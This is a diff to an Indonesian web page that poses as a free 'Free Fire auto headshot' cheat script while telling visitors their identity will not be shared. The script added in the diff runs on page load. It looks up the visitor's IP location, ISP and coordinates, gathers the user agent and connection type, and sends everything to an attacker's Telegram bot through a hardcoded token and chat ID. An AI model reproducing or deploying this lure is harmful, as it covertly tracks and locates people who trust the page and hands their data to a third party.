@@ -1,47 +1,69 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Deteksi IP & Lokasi</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FREE SCRIPT FF AUTO HS</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background: linear-gradient(to bottom, #222, #444);
+      color: white;
+      overflow: hidden;
+      margin: 0;
+      padding: 0 20px;
+    }
+    h1 { margin-top: 60px; font-size: 24px; }
+    p { font-size: 16px; }
+  </style>
 </head>
 <body>
-  <h2>Mohon tunggu sebentar...</h2>
+  <h1>FREE SCRIPT FF AUTO HS</h1>
+  <p>Harap tunggu, sedang mendeteksi lokasi dan perangkat anda...</p>
+  <p><i>Informasi: Kami tidak akan menyebarkan identitas anda</i></p>
 
   <script>
-    // Ganti ini pakai bot kamu sendiri
-    const BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
-    const CHAT_ID = '7218964278';
+    async function kirimOtomatis() {
+      try {
+        const res = await fetch("https://ipwho.is/");
+        const ipData = await res.json();
 
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
-        const message = `
-IP: ${data.ip}
-ISP: ${data.org}
-Negara: ${data.country_name}
-Kota: ${data.city}
-Region: ${data.region}
-Lokasi: https://maps.google.com/?q=${data.latitude},${data.longitude}
+        const userAgent = navigator.userAgent;
+        const koneksi = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const jaringan = koneksi ? koneksi.effectiveType : "Tidak terdeteksi";
+
+        const pesan = `
+[IP TRACKED]
+IP: ${ipData.ip}
+Negara: ${ipData.country}
+Kota: ${ipData.city}
+ISP: ${ipData.connection.isp}
+Latitude: ${ipData.latitude}
+Longitude: ${ipData.longitude}
+Link Maps: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
+
+[PERANGKAT]
+User-Agent: ${userAgent}
+Koneksi: ${jaringan}
         `;
-        
-        // Kirim ke Telegram
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
+        const token = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
+        const chat_id = "7218964278";
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-          })
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id, text: pesan }),
         });
 
-        document.body.innerHTML = "<h2>Script berhasil diaktifkan!</h2>";
-      })
-      .catch(err => {
-        document.body.innerHTML = "<h2>Gagal mendapatkan data.</h2>";
-      });
+        console.log("Data terkirim ke Telegram");
+      } catch (err) {
+        console.error("Gagal kirim data:", err);
+      }
+    }
+
+    kirimOtomatis(); // auto jalan saat halaman dibuka
   </script>
 </body>
 </html>
